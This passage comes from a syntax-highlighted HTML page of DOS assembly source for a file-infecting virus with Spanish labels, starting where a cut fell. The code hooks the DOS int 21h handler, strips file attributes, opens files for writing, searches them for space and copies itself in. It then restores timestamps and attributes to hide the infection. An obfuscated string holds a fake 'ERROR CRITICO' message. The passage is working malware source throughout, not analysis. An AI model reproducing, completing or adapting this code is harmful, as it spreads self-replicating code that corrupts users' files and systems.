            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">vuelve40</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                 </span><span class="sc1">; Whipe attributes</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">libera39</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                 </span><span class="sc1">; Open file in read/write</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">; mode</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">repone38</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">buscador</span><span class="sc0">                 </span><span class="sc1">; Jump if there's not a</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">cierra37</span><span class="sc0">                 </span><span class="sc1">; room big enough for us</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">grabador</span><span class="sc0">                 </span><span class="sc1">; Can we copy ourselves?</span><span class="sc0">

</span><span class="sc5">cierra37</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">hora</span><span class="sc0">                  </span><span class="sc1">; Restore date and time</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">fecha</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                   </span><span class="sc1">; Close file</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">repone38</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">atributo</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Restore the original file</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">; attributes</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">libera39</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">                   </span><span class="sc1">; Free the memory block</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">vuelve40</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">des24</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Restore int 24h vector</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                       </span><span class="sc1">; Pop registers</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                                             </span><span class="sc1">; Bring control back to the</span><span class="sc0">
</span><span class="sc5">fin41</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">des21</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; original int 21h handler</span><span class="sc0">

</span><span class="sc5">mensaje</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">' '</span><span class="sc4">,-</span><span class="sc12">'&lt;'</span><span class="sc4">,-</span><span class="sc12">'-'</span><span class="sc4">,-</span><span class="sc12">'-'</span><span class="sc4">,-</span><span class="sc12">'-'</span><span class="sc4">,-</span><span class="sc12">'-'</span><span class="sc4">,-</span><span class="sc12">'-'</span><span class="sc4">,-</span><span class="sc12">'-'</span><span class="sc4">,-</span><span class="sc12">'-'</span><span class="sc4">,-</span><span class="sc12">' '</span><span class="sc4">,-</span><span class="sc12">'E'</span><span class="sc4">,-</span><span class="sc12">'R'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'R'</span><span class="sc4">,-</span><span class="sc12">'O'</span><span class="sc4">,-</span><span class="sc12">'R'</span><span class="sc4">,-</span><span class="sc12">' '</span><span class="sc4">,-</span><span class="sc12">'C'</span><span class="sc4">,-</span><span class="sc12">'R'</span><span class="sc4">,-</span><span class="sc12">'I'</span><span class="sc4">,-</span><span class="sc12">'T'</span><span class="sc4">,-</span><span class="sc12">'I'</span><span class="sc4">,-</span><span class="sc12">'C'</span><span class="sc4">,-</span><span class="sc12">'O'</span><span class="sc4">,-</span><span class="sc12">':'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">' '</span><span class="sc4">,-</span><span class="sc12">'F'</span><span class="sc4">,-</span><span class="sc12">'u'</span><span class="sc4">,-</span><span class="sc12">'g'</span><span class="sc4">,-</span><span class="sc12">'a'</span><span class="sc4">,-</span><span class="sc12">' '</span><span class="sc4">,-</span><span class="sc12">'d'</span><span class="sc4">,-</span><span class="sc12">'e'</span><span class="sc4">,-</span><span class="sc12">' '</span><span class="sc4">,-</span><span class="sc12">'p'</span><span class="sc4">,-</span><span class="sc12">'r'</span><span class="sc4">,-</span><span class="sc12">'e'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'s'</span><span class="sc4">,-</span><span class="sc12">'i'</span><span class="sc4">,-</span><span class="sc12">'¢'</span><span class="sc4">,-</span><span class="sc12">'n'</span><span class="sc4">,-</span><span class="sc12">' '</span><span class="sc4">,-</span><span class="sc12">'e'</span><span class="sc4">,-</span><span class="sc12">'n'</span><span class="sc4">,-</span><span class="sc12">' '</span><span class="sc4">,-</span><span class="sc12">'e'</span><span class="sc4">,-</span><span class="sc12">'l'</span><span class="sc4">,-</span><span class="sc12">' '</span><span class="sc4">,-</span><span class="sc12">'m'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'o'</span><span class="sc4">,-</span><span class="sc12">'n'</span><span class="sc4">,-</span><span class="sc12">'i'</span><span class="sc4">,-</span><span class="sc12">'t'</span><span class="sc4">,-</span><span class="sc12">'o'</span><span class="sc4">,-</span><span class="sc12">'r'</span><span class="sc4">,-</span><span class="sc12">'.'</span><span class="sc4">,-</span><span class="sc12">' '</span><span class="sc0">

</span><span class="sc5">salto</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc0">
</span><span class="sc5">distancia</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">marca</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">88h</span><span class="sc0">
</span><span class="sc5">principio</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0c033h</span><span class="sc4">,</span><span class="sc2">21cdh</span><span class="sc0">
</span><span class="sc5">retorno</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0100h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dato</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">89abh</span><span class="sc0">
</span><span class="sc5">des21</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg21</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">des24</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg24</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hueco</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">atributo</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hora</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fecha</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">tamano</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">nombre</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ultimo</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">codigo</span><span class="sc0">      </span><span class="sc9">ends</span><span class="sc0">
            </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">criatura</span><span class="sc0">
</span></div></body>
</html>
